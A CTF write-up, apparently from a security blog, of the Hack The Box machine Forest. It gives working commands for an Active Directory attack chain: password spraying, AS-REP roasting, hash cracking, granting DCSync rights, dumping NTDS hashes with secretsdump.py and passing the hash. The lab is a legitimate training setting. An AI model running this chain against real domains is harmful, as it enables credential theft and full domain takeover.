---
title: "HTB Forest"
categories:
  - CTF
tags:
  - Post OSCP
  - Active Directory
  - HTB
---

Forest HTB walkthrough

| ----------- | ----------- |
| OS | Windows |
| Difficulty | Easy |
| Points | 20 | 
| Release | 12 Oct 2019 |
| IP | 10.10.10.161 | 


Forest is a great beginner box. It covers some core Domain Controller/Active Directory enumeration and exploitation techniques such as RPC enumeration, AS-REP roasting and DCSync exploitation. 

## Enumeration
As usual, we start by enumerating active services on the box using nmap

```
nmap -p- -sC -sV 10.10.10.161
```

``` 
-p-	all ports
-sC	run default scripts
-sV	enumerate service versions
```

![Nmap]({{site.url}}/assets/CTF/HTB-Forest/Nmap.png)

Based on the enumerated ports, in particular 88 (Kerberos) and 389 (ldap) , this instantly looks like a domain controller. Also, interestingly port 5985 (WinRM) is open. WinRM (Windows Remote Management) is a built-in remote management protocol allows for command execution on remote computers and servers, providing you have valid credentials.


When enumerating windows boxes it is common to be bombarded with an array of open ports, therefore it is best practise to prioritise those which can provide ‘quick wins’ – these are typically any services that don’t implicitly require authentication to obtain information from – such as FTP, SMB, DNS, HTTP etc.
In our case this would be DNS probably won’t provide us with many initial gains as there’s no active web services for us to attack via subdomains, therefore initially its best to focus our efforts on SMB.

### SMB
The potential quick win is to see if there are any shares we can null authenticate to:

```
smbclient -L 10.10.10.161 -N
```
```
-L	list
-N	no password
```
![SMBClient]({{site.url}}/assets/CTF/HTB-Forest/SMBClient.png)

So no luck there.

### User Enumeration
We have 2 options when it comes to trying to enumerate usernames from the domain controller – we can use enum4linux to do all the work for us, or we can manually connect via rpcclient.

Enum4Linux
```
enum4linux -U 10.10.10.161
```
```
-U        get userlist
```
![Enum4Linux]({{site.url}}/assets/CTF/HTB-Forest/Enum4Linux.png)

This has the advantage of also providing us with the domain name being utilise – HTB.

Rpcclient
```
rpcclient -U "" -N 10.10.10.161
$> enumdomusers
```

```
-U username
-N no-password
```
![rpcclient]({{site.url}}/assets/CTF/HTB-Forest/rpcclient.png)

## Path to User.
Now that we have a list of users, we can start building towards getting credentials. Initially I attempted to password spray using crack-map-exec (cme).
```
cme smb 10.10.10.161 -u userlist -p 'Welcome123!'
```
```
-u userlist
-p password
```

![cme1]({{site.url}}/assets/CTF/HTB-Forest/cme1.png)

No common passwords worked with this method.
*when password spaying in a real-life environment it is essential that you identify what lockout policy is in place to ensure you do not lock out accounts*

As the Kerberos service is accessible, are next option is to identifiy if we can grab any ticket based hashes. Typically you require credentials in order to acquire Kerberos ticket hashes, however if an account has ‘pre-authentication’ turned off, you only need an account name. This is far better explain by the following [blog](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).

Using the impacket script ‘GetNPUsers.py’ we can use are previously obtained user list to identify if any accounts are vulnerable to AS-REP Roasting.

```
GetNPUsers.py HTB/ -usersfile userlist -format john -outputfile hashes.asreproast -no-pass -dc-ip 10.10.10.161
```
![asreproast]({{site.url}}/assets/CTF/HTB-Forest/asreproast.png)

So we’ve successfully obtained a hash for the svc-alfresco user. We should now be able to try and crack this with john.

![john]({{site.url}}/assets/CTF/HTB-Forest/john.png)

So we’ve now got credentials we can try and use to connect over WinRM. Personally I like to use [evil-winrm](https://github.com/Hackplayers/evil-winrm) for this. Once connected, the user.txt flag can been found in the Desktop directory.

![evilwinrm]({{site.url}}/assets/CTF/HTB-Forest/evilwinrm.png)


*I recommend using the -s . command to allow you the option to load powershell modules from your current working directory, should you need them later on*

## Path to Root (Administrator).
Once you’ve obtained valid credentials and a foothold onto an active directory environment, my first recommendation would always been to use [bloodhound](https://bloodhound.readthedocs.io/en/latest/index.html) to map it.

You have multiple options when it comes to obtaining the relevant information from active directory – you can use either the powershell or executable SharpHound ingestors or, my personal preference, bloodhound-python.

```
bloodhound-python -u svc-alfresco -d htb.local -c all -dc forest.htb.local -ns 10.10.10.161
```
```
-u	username
-d	fully qualified domain name
-c	collection method
-dc	domain controller
-ns	name server
```
![bloodhound-python]({{site.url}}/assets/CTF/HTB-Forest/bloodhound-python.png)

Once the applicable data has been obtained, it can be visualised in blood-hound and potential attack paths identified.

In this instance, if we set ‘svc-alfresco’ as ‘owned’ and then run the ‘Shortest Paths to Domain Admins from Owned Principals’ the following attack path is revealed.

![bloodhound]({{site.url}}/assets/CTF/HTB-Forest/bloodhound.png)

If we follow all of the ‘MemberOf’ streams we can see that effectively our compromised user ‘svc-alfresco’ is effectively a member of the ‘Account Operators’ group. The Account Operators has ‘Generic All’ privilege on the Exchange Windows Permissions group, this allows us to effectively add ourselves as a member of the Exchange Windows Permissions group. Once our user is added to this group we will have be able to grant ourselves DCSync privileges on the domain, allowing us to dump all domain hashes for all users.

### Stage 1
Adding ourselves implicitly to the ‘Exchange Windows Permissions’ group is pretty simple using the [PowerView]( https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 ‘Add-DomainGroup’ module.
```
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
```

![addgroupmember]({{site.url}}/assets/CTF/HTB-Forest/addgroupmember.png)

### Stage 2
Now we are a member of this group, we can add DCSync privileges using the below 
```
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force; 
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword); 
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL -Rights DCSync;
```

### Stage 3
Now that our svc-alfresco user had DCSync privleges on the domain, we can use impackets ‘SecretsDump.py’ to obtain hashed user credentials from the NTDS.dit file.
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```

It is worth noting that there is some form of Cron Job in place designed to reset svc-alfresco’s group membership and permissions, so if the above stages 1 and 2 are not completed fast enough you will not be able to DCSync. I would therefore recommend running them as one script and be ready with your secretsdump.py command.
![ACLUpdate]({{site.url}}/assets/CTF/HTB-Forest/aclupdate.png)

![secretsdump]({{site.url}}/assets/CTF/HTB-Forest/secretsdump.png)


### ACLPwn.py
If you’re thinking this methodology is a bit long winded in terms of both identifying an attack path, and exploiting it there is an automated way, [ACLPwn](https://github.com/fox-it/aclpwn.py).
*ACLPwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths. It takes a starting and ending point and will use Neo4j pathfinding algorithms to find the most efficient ACL based privilege escalation path.*

By using the ‘-dry’ command you can use ACLPwn.py to identify any attack paths that might be present.

![acldry]({{site.url}}/assets/CTF/HTB-Forest/acldry.png)


On finding a valid attack path, you can also utilise ACLPwn to automatically execute the changes on the domain.

![aclpwn]({{site.url}}/assets/CTF/HTB-Forest/aclpwn.png)

If working in a live environment, it is essentially that you take note of the ‘.restore’ file. This will allow you to revert any changes you have made using ACLPwn via the -r command.

We can now use secretsdump.py as before to dump ntds.dit user hashes.

#PTH
Now we have an valid administrator hash, we could attempt to crack it, or we can simply utilise the NTLM hash to authenticate to the box by ‘passing the hash’.

There are multiple tools that will allow you to do this, however I decided to stick with evil-winrm and use the -H flag to authenticate using the administrator hash.

![rootflag]({{site.url}}/assets/CTF/HTB-Forest/rootflag.png)


